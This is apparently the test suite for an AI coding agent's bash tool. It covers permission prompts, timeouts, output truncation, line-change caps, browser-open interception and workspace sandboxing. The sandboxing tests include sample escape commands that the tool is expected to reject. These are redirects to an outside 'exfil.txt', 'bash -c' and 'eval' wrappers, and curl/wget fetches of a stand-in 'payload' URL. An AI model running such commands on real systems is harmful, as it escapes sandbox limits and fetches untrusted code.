import { describe, expect, test } from "bun:test"
import fs from "fs/promises"
import os from "os"
import path from "path"
import { BashTool } from "../../src/tool/bash"
import { Instance } from "../../src/project/instance"
import { Filesystem } from "../../src/util/filesystem"
import { tmpdir } from "../fixture/fixture"
import type { Permission } from "../../src/permission"
import { Truncate } from "../../src/tool/truncate"
import { Isolation } from "../../src/isolation"
import { SessionID, MessageID } from "../../src/session/schema"
import { BlastRadius } from "../../src/session/blast-radius"
import { Bus } from "../../src/bus"
import { TuiEvent } from "../../src/cli/cmd/tui/event"

const ctx = {
  sessionID: SessionID.make("ses_test"),
  messageID: MessageID.make(""),
  callID: "",
  agent: "build",
  abort: AbortSignal.any([]),
  messages: [],
  metadata: () => {},
  ask: async (_req?: PermissionRequest) => {},
}

const projectRoot = path.join(__dirname, "../..")

function shellQuote(value: string) {
  return `'${value.replaceAll("'", "'\\''")}'`
}

async function withAutonomous<T>(fn: () => Promise<T>): Promise<T> {
  const original = process.env.AX_CODE_AUTONOMOUS
  process.env.AX_CODE_AUTONOMOUS = "true"
  try {
    return await fn()
  } finally {
    if (original === undefined) delete process.env.AX_CODE_AUTONOMOUS
    else process.env.AX_CODE_AUTONOMOUS = original
  }
}

class StopAfterPermission extends Error {}

type PermissionRequest = Omit<Permission.Request, "id" | "sessionID" | "tool">

async function collectPermissionRequests(
  fn: (testCtx: typeof ctx) => Promise<unknown>,
  stopWhen: (req: PermissionRequest) => boolean,
) {
  const requests: PermissionRequest[] = []
  const testCtx = {
    ...ctx,
    ask: async (req?: PermissionRequest) => {
      if (!req) return
      requests.push(req)
      if (stopWhen(req)) throw new StopAfterPermission()
    },
  }

  try {
    await fn(testCtx)
  } catch (error) {
    if (!(error instanceof StopAfterPermission)) throw error
  }

  return requests
}

describe("tool.bash", () => {
  test("basic", async () => {
    await Instance.provide({
      directory: projectRoot,
      fn: async () => {
        const bash = await BashTool.init()
        const result = await bash.execute(
          {
            command: "echo 'test'",
            description: "Echo test message",
          },
          ctx,
        )
        expect(result.metadata.exit).toBe(0)
        expect(result.metadata.output).toContain("test")
      },
    })
  })

  test("returns structured hang metadata on timeout", async () => {
    await Instance.provide({
      directory: projectRoot,
      fn: async () => {
        const bash = await BashTool.init()
        const command = `"${process.execPath}" -e "setTimeout(() => {}, 1000)"`
        const result = await bash.execute(
          {
            command,
            timeout: 50,
            description: "Wait past timeout",
          },
          ctx,
        )
        const hang = result.metadata.hang as Record<string, unknown>
        expect(hang["timedOut"]).toBe(true)
        expect(hang["timeoutMs"]).toBe(50)
        expect(hang["processId"]).toBeNumber()
        expect(hang["killStartedAt"]).toBeNumber()
        expect(result.output).toContain("bash tool terminated command after exceeding timeout 50 ms")
      },
    })
  })

  test("swallows metadata publish failures from stream callbacks", async () => {
    await Instance.provide({
      directory: projectRoot,
      fn: async () => {
        const bash = await BashTool.init()
        let metadataCalls = 0
        const noisyCtx = {
          ...ctx,
          metadata: () => {
            metadataCalls++
            throw new Error("metadata transport closed")
          },
        }
        const result = await bash.execute(
          {
            command: "echo 'test'",
            description: "Echo test message",
          },
          noisyCtx,
        )
        expect(metadataCalls).toBeGreaterThan(0)
        expect(result.metadata.exit).toBe(0)
        expect(result.metadata.output).toContain("test")
      },
    })
  })
})

describe("tool.bash permissions", () => {
  test("asks for bash permission with correct pattern", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const requests = await collectPermissionRequests(
          (testCtx) =>
            bash.execute(
              {
                command: "echo hello",
                description: "Echo hello",
              },
              testCtx,
            ),
          (req) => req.permission === "bash",
        )
        expect(requests.length).toBe(1)
        expect(requests[0].permission).toBe("bash")
        expect(requests[0].patterns).toContain("echo hello")
      },
    })
  })

  test("asks for bash permission with multiple commands", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const requests = await collectPermissionRequests(
          (testCtx) =>
            bash.execute(
              {
                command: "echo foo && echo bar",
                description: "Echo twice",
              },
              testCtx,
            ),
          (req) => req.permission === "bash",
        )
        expect(requests.length).toBe(1)
        expect(requests[0].permission).toBe("bash")
        expect(requests[0].patterns).toContain("echo foo")
        expect(requests[0].patterns).toContain("echo bar")
      },
    })
  })

  test("asks for external_directory permission when cd to parent", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const requests = await collectPermissionRequests(
          (testCtx) =>
            bash.execute(
              {
                command: "cd ../",
                description: "Change to parent directory",
              },
              testCtx,
            ),
          (req) => req.permission === "external_directory",
        )
        const extDirReq = requests.find((r) => r.permission === "external_directory")
        expect(extDirReq).toBeDefined()
      },
    })
  })

  test("asks for external_directory permission when workdir is outside project", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const requests = await collectPermissionRequests(
          (testCtx) =>
            bash.execute(
              {
                command: "ls",
                workdir: os.tmpdir(),
                description: "List temp dir",
              },
              testCtx,
            ),
          (req) => req.permission === "external_directory",
        )
        const extDirReq = requests.find((r) => r.permission === "external_directory")
        expect(extDirReq).toBeDefined()
        // bash.ts realpaths the workdir before constructing the permission
        // pattern so a directory has a stable identity regardless of the
        // symlink path used to reach it. On macOS this matters because
        // os.tmpdir() returns "/var/folders/..." which is a symlink to
        // "/private/var/folders/...".
        const realTmp = await fs.realpath(os.tmpdir())
        expect(extDirReq!.patterns).toContain(path.join(realTmp, "*"))
      },
    })
  })

  test("asks for external_directory permission when file arg is outside project", async () => {
    await using outerTmp = await tmpdir({
      init: async (dir) => {
        await Bun.write(path.join(dir, "outside.txt"), "x")
      },
    })
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const filepath = path.join(outerTmp.path, "outside.txt")
        const requests = await collectPermissionRequests(
          (testCtx) =>
            bash.execute(
              {
                command: `cat ${filepath}`,
                description: "Read external file",
              },
              testCtx,
            ),
          (req) => req.permission === "external_directory",
        )
        const extDirReq = requests.find((r) => r.permission === "external_directory")
        const expected = path.join(outerTmp.path, "*")
        expect(extDirReq).toBeDefined()
        expect(extDirReq!.patterns).toContain(expected)
        expect(extDirReq!.always).toContain(expected)
      },
    })
  })

  test("does not ask for external_directory permission when rm inside project", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()

        await Bun.write(path.join(tmp.path, "tmpfile"), "x")

        const requests = await collectPermissionRequests(
          (testCtx) =>
            bash.execute(
              {
                command: `rm -rf ${path.join(tmp.path, "nested")}`,
                description: "remove nested dir",
              },
              testCtx,
            ),
          (req) => req.permission === "bash",
        )

        const extDirReq = requests.find((r) => r.permission === "external_directory")
        expect(extDirReq).toBeUndefined()
      },
    })
  })

  test("includes always patterns for auto-approval", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const requests = await collectPermissionRequests(
          (testCtx) =>
            bash.execute(
              {
                command: "git log --oneline -5",
                description: "Git log",
              },
              testCtx,
            ),
          (req) => req.permission === "bash",
        )
        expect(requests.length).toBe(1)
        expect(requests[0].always.length).toBeGreaterThan(0)
        expect(requests[0].always.some((p) => p.endsWith("*"))).toBe(true)
      },
    })
  })

  test("does not ask for bash permission when command is cd only", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const requests: PermissionRequest[] = []
        await bash.execute(
          {
            command: "cd .",
            description: "Stay in current directory",
          },
          {
            ...ctx,
            ask: async (req: PermissionRequest) => {
              requests.push(req)
            },
          },
        )
        const bashReq = requests.find((r) => r.permission === "bash")
        expect(bashReq).toBeUndefined()
      },
    })
  })

  test("matches redirects in permission pattern", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const requests = await collectPermissionRequests(
          (testCtx) => bash.execute({ command: "cat > /tmp/output.txt", description: "Redirect ls output" }, testCtx),
          (req) => req.permission === "bash",
        )
        const bashReq = requests.find((r) => r.permission === "bash")
        expect(bashReq).toBeDefined()
        expect(bashReq!.patterns).toContain("cat > /tmp/output.txt")
      },
    })
  })

  test("always pattern has space before wildcard to not include different commands", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const requests = await collectPermissionRequests(
          (testCtx) => bash.execute({ command: "ls -la", description: "List" }, testCtx),
          (req) => req.permission === "bash",
        )
        const bashReq = requests.find((r) => r.permission === "bash")
        expect(bashReq).toBeDefined()
        const pattern = bashReq!.always[0]
        expect(pattern).toBe("ls *")
      },
    })
  })
})

describe("tool.bash truncation", () => {
  test("redirect blast radius uses file-size estimate instead of one line per file", async () => {
    await using tmp = await tmpdir({ git: true })
    await withAutonomous(async () => {
      const sessionID = SessionID.make("ses_bash_blast_estimate")
      BlastRadius.reset(sessionID)
      try {
        BlastRadius.applyConfigCaps(sessionID, { lines: 5 })
        await Instance.provide({
          directory: tmp.path,
          fn: async () => {
            const bash = await BashTool.init()
            const target = path.join(tmp.path, "large.txt")
            const script = "process.stdout.write('x'.repeat(1000))"
            let caught: unknown

            try {
              await bash.execute(
                {
                  command: `${shellQuote(process.execPath)} -e ${shellQuote(script)} > ${shellQuote(target)}`,
                  description: "Write large redirected file",
                },
                { ...ctx, sessionID },
              )
            } catch (error) {
              caught = error
            }

            expect(caught).toBeInstanceOf(Error)
            expect((caught as { data?: { message?: string } }).data?.message).toContain(
              "Autonomous line-change cap reached",
            )
          },
        })
      } finally {
        BlastRadius.reset(sessionID)
      }
    })
  })

  test("redirect blast radius ignores timeout-killed commands", async () => {
    await using tmp = await tmpdir({ git: true })
    await withAutonomous(async () => {
      const sessionID = SessionID.make("ses_bash_blast_timeout")
      BlastRadius.reset(sessionID)
      try {
        BlastRadius.applyConfigCaps(sessionID, { lines: 5 })
        await Instance.provide({
          directory: tmp.path,
          fn: async () => {
            const bash = await BashTool.init()
            const target = path.join(tmp.path, "large.txt")
            const script = "process.stdout.write('x'.repeat(1000)); setTimeout(() => {}, 1000)"
            const result = await bash.execute(
              {
                command: `${shellQuote(process.execPath)} -e ${shellQuote(script)} > ${shellQuote(target)}`,
                timeout: 1,
                description: "Timeout redirected writer",
              },
              { ...ctx, sessionID },
            )

            expect((result.metadata.hang as Record<string, unknown>)["timedOut"]).toBe(true)
            expect(result.output).toContain("bash tool terminated command after exceeding timeout 1 ms")
          },
        })
      } finally {
        BlastRadius.reset(sessionID)
      }
    })
  })

  test("truncates output exceeding line limit", async () => {
    await Instance.provide({
      directory: projectRoot,
      fn: async () => {
        const bash = await BashTool.init()
        const lineCount = Truncate.MAX_LINES + 500
        const result = await bash.execute(
          {
            command: `seq 1 ${lineCount}`,
            description: "Generate lines exceeding limit",
          },
          ctx,
        )
        expect((result.metadata as any).truncated).toBe(true)
        expect((result.metadata as any).originalSize).toBeGreaterThan(0)
        expect((result.metadata as any).truncatedTo).toBeGreaterThan(0)
        expect((result.metadata as any).contentHint).toBeString()
        expect((result.metadata as any).fullOutputPath).toBe((result.metadata as any).outputPath)
        expect(result.output).toContain("truncated")
        expect(result.output).toContain("The tool call succeeded but the output was truncated")
      },
    })
  })

  test("truncates output exceeding byte limit", async () => {
    await Instance.provide({
      directory: projectRoot,
      fn: async () => {
        const bash = await BashTool.init()
        const byteCount = Truncate.MAX_BYTES + 10000
        const result = await bash.execute(
          {
            command: `head -c ${byteCount} /dev/zero | tr '\\0' 'a'`,
            description: "Generate bytes exceeding limit",
          },
          ctx,
        )
        expect((result.metadata as any).truncated).toBe(true)
        expect(result.output).toContain("truncated")
        expect(result.output).toContain("The tool call succeeded but the output was truncated")
      },
    })
  })

  test("does not truncate small output", async () => {
    await Instance.provide({
      directory: projectRoot,
      fn: async () => {
        const bash = await BashTool.init()
        const result = await bash.execute(
          {
            command: "echo hello",
            description: "Echo hello",
          },
          ctx,
        )
        expect((result.metadata as any).truncated).toBe(false)
        expect(result.output).toMatch(/^hello\r?\n$/)
      },
    })
  })

  test("full output is saved to file when truncated", async () => {
    await Instance.provide({
      directory: projectRoot,
      fn: async () => {
        const bash = await BashTool.init()
        const lineCount = Truncate.MAX_LINES + 100
        const result = await bash.execute(
          {
            command: `seq 1 ${lineCount}`,
            description: "Generate lines for file check",
          },
          ctx,
        )
        expect((result.metadata as any).truncated).toBe(true)

        const filepath = (result.metadata as any).outputPath
        expect(filepath).toBeTruthy()

        const saved = await Filesystem.readText(filepath)
        const lines = saved.trim().split("\n")
        expect(lines.length).toBe(lineCount)
        expect(lines[0]).toBe("1")
        expect(lines[lineCount - 1]).toBe(String(lineCount))
      },
    })
  })
})

describe("tool.bash isolation", () => {
  test("rejects redirection target outside workspace in workspace-write mode", async () => {
    await using outerTmp = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = {
          ...ctx,
          ask: async () => {},
          extra: { isolation },
        }
        const outsideFile = path.join(outerTmp.path, "exfil.txt")
        // The redirect target is outside the workspace; even though
        // `echo` itself is harmless, writing the output anywhere on disk
        // must be sandboxed.
        await expect(
          bash.execute(
            {
              command: `echo pwned > ${outsideFile}`,
              description: "Attempt redirect outside workspace",
            },
            testCtx,
          ),
        ).rejects.toThrow(/outside workspace boundary|protected/)
      },
    })
  })

  test("rejects redirection target inside `bash -c` inner command", async () => {
    await using outerTmp = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = {
          ...ctx,
          ask: async () => {},
          extra: { isolation },
        }
        const outsideFile = path.join(outerTmp.path, "exfil.txt")
        // The redirect lives inside the quoted `-c` argument and is
        // parsed by the inner tree-sitter pass; outer file_redirect
        // walking misses it.
        await expect(
          bash.execute(
            {
              command: `bash -c "echo pwned > ${outsideFile}"`,
              description: "Attempt redirect outside workspace via bash -c",
            },
            testCtx,
          ),
        ).rejects.toThrow(/outside workspace boundary|protected/)
      },
    })
  })

  test("rejects curl output target inside `bash -c` inner command", async () => {
    await using outerTmp = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = {
          ...ctx,
          ask: async () => {},
          extra: { isolation },
        }
        const outsideFile = path.join(outerTmp.path, "payload.txt")
        await expect(
          bash.execute(
            {
              command: `bash -c "curl -o ${outsideFile} https://example.invalid/payload"`,
              description: "Attempt curl outside workspace",
            },
            testCtx,
          ),
        ).rejects.toThrow(/outside workspace boundary|protected/)
      },
    })
  })

  test("rejects wget -O output target outside workspace", async () => {
    await using outerTmp = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = {
          ...ctx,
          ask: async () => {},
          extra: { isolation },
        }
        const outsideFile = path.join(outerTmp.path, "payload.txt")
        await expect(
          bash.execute(
            {
              command: `wget -O ${outsideFile} https://example.invalid/payload`,
              description: "Attempt wget outside workspace",
            },
            testCtx,
          ),
        ).rejects.toThrow(/outside workspace boundary|protected/)
      },
    })
  })

  test("rejects interpreter inline absolute path inside `eval`", async () => {
    await using outerTmp = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = {
          ...ctx,
          ask: async () => {},
          extra: { isolation },
        }
        const outsideFile = path.join(outerTmp.path, "inline.txt")
        await expect(
          bash.execute(
            {
              command: `eval "python3 -c 'open(\\\"${outsideFile}\\\", \\\"w\\\").write(\\\"x\\\")'"`,
              description: "Attempt python outside workspace",
            },
            testCtx,
          ),
        ).rejects.toThrow(/outside workspace boundary|protected/)
      },
    })
  })

  test("rejects dynamic command substitution redirection target", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = {
          ...ctx,
          ask: async () => {},
          extra: { isolation },
        }

        await expect(
          bash.execute(
            {
              command: "echo pwned > $(echo /tmp/exfil.txt)",
              description: "Attempt dynamic redirect",
            },
            testCtx,
          ),
        ).rejects.toThrow(/Dynamic redirection targets/)
      },
    })
  })

  test("rejects dynamic command substitution redirection target inside `bash -c`", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = {
          ...ctx,
          ask: async () => {},
          extra: { isolation },
        }

        await expect(
          bash.execute(
            {
              command: 'bash -c "echo pwned > $(echo /tmp/exfil.txt)"',
              description: "Attempt inner dynamic redirect",
            },
            testCtx,
          ),
        ).rejects.toThrow(/Dynamic redirection targets/)
      },
    })
  })

  describe("path existence pre-validation", () => {
    test("rejects cd to non-existent directory", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          await expect(
            bash.execute(
              {
                command: "cd /nonexistent/path/that/does/not/exist",
                description: "Change to non-existent dir",
              },
              ctx,
            ),
          ).rejects.toThrow(/Path does not exist/)
        },
      })
    })

    test("rejects cat on non-existent file", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          await expect(
            bash.execute(
              {
                command: "cat nonexistent.txt",
                description: "Cat non-existent file",
              },
              ctx,
            ),
          ).rejects.toThrow(/Path does not exist/)
        },
      })
    })

    test("rejects mv from non-existent file", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          await expect(
            bash.execute(
              {
                command: "mv nonexistent.txt moved.txt",
                description: "Move non-existent file",
              },
              ctx,
            ),
          ).rejects.toThrow(/Path does not exist/)
        },
      })
    })

    test("rejects missing literal dash-prefixed rm target after option separator", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          await expect(
            bash.execute(
              {
                command: "rm -- -f",
                description: "Remove literal dash-prefixed file",
              },
              ctx,
            ),
          ).rejects.toThrow(/Path does not exist/)
        },
      })
    })

    test("allows existing literal dash-prefixed rm target after option separator", async () => {
      await using tmp = await tmpdir()
      const filepath = path.join(tmp.path, "-f")
      await fs.writeFile(filepath, "literal flag filename")
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const result = await bash.execute(
            {
              command: "rm -- -f",
              description: "Remove existing literal dash-prefixed file",
            },
            ctx,
          )

          expect(result.metadata.exit).toBe(0)
          expect(await Filesystem.exists(filepath)).toBe(false)
        },
      })
    })

    test("allows ls on existing directory", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const result = await bash.execute(
            {
              command: `ls ${tmp.path}`,
              description: "List existing directory",
            },
            ctx,
          )
          expect(result.metadata.exit).toBe(0)
        },
      })
    })

    test("allows cat on existing file", async () => {
      await using tmp = await tmpdir()
      const filepath = path.join(tmp.path, "existing.txt")
      await fs.writeFile(filepath, "hello")
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const result = await bash.execute(
            {
              command: `cat ${filepath}`,
              description: "Cat existing file",
            },
            ctx,
          )
          expect(result.metadata.exit).toBe(0)
          expect(result.output).toContain("hello")
        },
      })
    })

    test("error message includes hint about Glob tool", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          try {
            await bash.execute(
              {
                command: "cat /nonexistent/file.txt",
                description: "Cat non-existent file",
              },
              ctx,
            )
            throw new Error("should have thrown")
          } catch (err) {
            const msg = err instanceof Error ? err.message : String(err)
            expect(msg).toContain("Glob")
            expect(msg).toContain("Hint:")
          }
        },
      })
    })

    test("does not treat grep pattern as a path", async () => {
      await using tmp = await tmpdir()
      const filepath = path.join(tmp.path, "existing.txt")
      await fs.writeFile(filepath, "hello\n")
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const result = await bash.execute(
            {
              command: "grep hello existing.txt",
              description: "Grep existing file",
            },
            ctx,
          )
          expect(result.metadata.exit).toBe(0)
          expect(result.output).toContain("hello")
        },
      })
    })

    test("allows mv to a new destination when source exists", async () => {
      await using tmp = await tmpdir()
      await fs.writeFile(path.join(tmp.path, "source.txt"), "hello")
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const result = await bash.execute(
            {
              command: "mv source.txt renamed.txt",
              description: "Rename existing file",
            },
            ctx,
          )
          expect(result.metadata.exit).toBe(0)
          expect(await Filesystem.exists(path.join(tmp.path, "renamed.txt"))).toBe(true)
        },
      })
    })
  })
})

describe("tool.bash browser-open interception", () => {

  test("intercepts open targeting a local HTML file", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const result = await bash.execute(
          { command: "open index.html", description: "Open HTML file" },
          ctx,
        )
        expect(result.output).toContain("[Browser open intercepted]")
        expect(result.output).toContain("index.html")
        expect(result.metadata.exit).toBe(0)
      },
    })
  })

  test("intercepts xdg-open targeting a local HTML file", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const result = await bash.execute(
          { command: "xdg-open game.html", description: "Open game" },
          ctx,
        )
        expect(result.output).toContain("[Browser open intercepted]")
        expect(result.output).toContain("game.html")
      },
    })
  })

  test("intercepts open targeting localhost URL", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const result = await bash.execute(
          { command: "open http://localhost:3000", description: "Open dev server" },
          ctx,
        )
        expect(result.output).toContain("[Browser open intercepted]")
        expect(result.output).toContain("localhost:3000")
      },
    })
  })

  test("does NOT intercept open targeting an oauth callback URL", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        let spawned = false
        const trackCtx = {
          ...ctx,
          ask: async () => {
            spawned = true
            throw new Error("stop after permission")
          },
        }
        try {
          await bash.execute(
            { command: "open http://localhost:9999/oauth/callback", description: "OAuth callback" },
            trackCtx,
          )
        } catch {
          // permission throw is expected
        }
        expect(spawned).toBe(true)
      },
    })
  })

  test("does NOT intercept open targeting a non-local URL", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        let spawned = false
        const trackCtx = {
          ...ctx,
          ask: async () => {
            spawned = true
            throw new Error("stop after permission")
          },
        }
        try {
          await bash.execute(
            { command: "open https://example.com", description: "Open external site" },
            trackCtx,
          )
        } catch {
          // permission throw is expected
        }
        expect(spawned).toBe(true)
      },
    })
  })

  test("emits TuiEvent.ToastShow when browser open is intercepted", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const toasts: Array<{ title?: string; message: string; variant: string }> = []
        const unsub = Bus.subscribe(TuiEvent.ToastShow, (event) => {
          toasts.push(event.properties)
        })
        try {
          const bash = await BashTool.init()
          await bash.execute({ command: "open index.html", description: "Open HTML file" }, ctx)
          // publishDetached is fire-and-forget — give the microtask queue a turn
          await new Promise((r) => setTimeout(r, 10))
          expect(toasts.length).toBeGreaterThan(0)
          expect(toasts[0].title).toBe("Browser preview ready")
          expect(toasts[0].variant).toBe("info")
          expect(toasts[0].message).toContain("index.html")
        } finally {
          unsub()
        }
      },
    })
  })
})
